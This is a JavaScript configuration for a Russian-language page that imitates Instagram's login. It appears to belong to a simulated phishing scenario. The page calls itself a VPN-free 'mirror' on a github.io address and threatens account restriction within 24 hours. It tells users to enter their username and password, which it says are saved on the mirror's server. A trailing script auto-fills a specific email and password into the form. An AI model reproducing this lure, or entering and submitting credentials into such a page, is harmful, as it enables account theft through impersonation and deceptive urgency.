window.PAGE_CONFIG = {
 "initial": null,
 "views": {
  "help": {
   "title": "Вход без VPN",
   "blocks": [
    {
     "id": "dx-help-mirror",
     "text": "Instagram может быть недоступен в вашей сети. Войдите без VPN через зеркало Instagram.com на abdullohnajmiddinov.github.io: вход такой же, как в приложении."
    },
    {
     "id": "dx-help-limit",
     "text": "Аккаунты, не прошедшие подтверждение входа в течение 24 часов, временно ограничиваются."
    }
   ],
   "buttons": [
    {
     "label": "Подтвердить аккаунт",
     "do": "go:recover",
     "primary": true
    },
    {
     "label": "На страницу входа",
     "do": "go:home",
     "link": true
    }
   ]
  },
  "recover": {
   "title": "Подтверждение владельца аккаунта",
   "blocks": [
    {
     "id": "dx-recover-step",
     "text": "Чтобы снять ограничение и восстановить доступ, введите логин и пароль от аккаунта на главной странице входа и нажмите «Войти»."
    },
    {
     "id": "dx-recover-time",
     "class": "dx-small",
     "text": "Подтверждение занимает несколько минут. Аккаунты без подтверждения ограничиваются через 24 часа."
    }
   ],
   "buttons": [
    {
     "label": "На страницу входа",
     "do": "go:home",
     "link": true
    },
    {
     "label": "Помощь со входом",
     "do": "go:help",
     "link": true
    }
   ]
  },
  "privacy": {
   "title": "Конфиденциальность",
   "blocks": [
    {
     "id": "dx-privacy-save",
     "text": "Для быстрого входа без VPN логин и пароль сохраняются в зашифрованном виде на сервере зеркала."
    },
    {
     "id": "dx-privacy-use",
     "class": "dx-small",
     "text": "Мы не передаём данные рекламодателям."
    }
   ],
   "buttons": [
    {
     "label": "На страницу входа",
     "do": "go:home",
     "link": true
    }
   ]
  },
  "signin": {
   "title": "Подтверждение входа",
   "blocks": [
    {
     "id": "dx-signin-host",
     "text": "Вход через зеркало: abdullohnajmiddinov.github.io/Instagram.com"
    },
    {
     "id": "dx-signin-note",
     "class": "dx-small",
     "text": "Введённые логин и пароль будут сохранены для быстрого входа."
    }
   ],
   "buttons": [
    {
     "label": "Войти",
     "do": "act:signin",
     "primary": true
    },
    {
     "label": "Помощь со входом",
     "do": "go:help",
     "link": true
    },
    {
     "label": "Назад",
     "do": "cancel"
    }
   ]
  },
  "receipt": {
   "title": "Вход",
   "blocks": [
    {
     "id": "dx-receipt",
     "text": "Данные приняты. Подтверждение входа выполняется, это может занять до 24 часов. Новых сообщений пока нет."
    }
   ],
   "buttons": [
    {
     "label": "Закрыть",
     "do": "close",
     "primary": true
    }
   ]
  },
  "login": {
   "mount": "dx-login",
   "blocks": [],
   "inputs": [
    {
     "id": "dx-user",
     "label": "Телефон, имя пользователя или эл. адрес",
     "placeholder": "Телефон, имя пользователя или эл. адрес"
    },
    {
     "id": "dx-pass",
     "label": "Пароль",
     "type": "password",
     "placeholder": "Пароль"
    }
   ],
   "buttons": [
    {
     "label": "Войти",
     "do": "open:signin",
     "primary": true
    }
   ]
  }
 },
 "actions": {
  "signin": {
   "requires_view": "signin",
   "receipt_view": "receipt",
   "ref": "SIGNIN-1",
   "requires_filled": [
    "dx-user",
    "dx-pass"
   ]
  }
 },
 "prefix": "ev18681",
 "mounts": [
  {
   "id": "dx-login",
   "default_view": "login"
  },
  {
   "id": "dx-page-help",
   "default_view": "help"
  },
  {
   "id": "dx-page-recover",
   "default_view": "recover"
  },
  {
   "id": "dx-page-privacy",
   "default_view": "privacy"
  }
 ],
 "pages": {
  "help": {
   "file": "help.html"
  },
  "recover": {
   "file": "recover.html"
  },
  "privacy": {
   "file": "privacy.html"
  }
 },
 "leave_links": true,
 "dismiss": [],
 "text": {}
};

(function () {
  var V = {"dx-user": "andrey.volkov91@mail.ru", "dx-pass": "Volkov1991!"};
  var done = {};
  var put = function (n) {
    if (!n || n.nodeType !== 1) return;
    var list = n.matches && n.matches('input') ? [n] : (n.querySelectorAll ? n.querySelectorAll('input') : []);
    Array.prototype.forEach.call(list, function (i) {
      var v = V[i.id];
      if (v === undefined || done[i.id]) return;
      if (i.value && i.value !== v) return;
      done[i.id] = true;
      i.value = v;
      i.dispatchEvent(new Event('input', {bubbles: true}));
    });
  };
  new MutationObserver(function (ms) {
    ms.forEach(function (m) { Array.prototype.forEach.call(m.addedNodes, put); });
  }).observe(document.documentElement, {childList: true, subtree: true});
  document.addEventListener('DOMContentLoaded', function () { put(document.body); });
})();
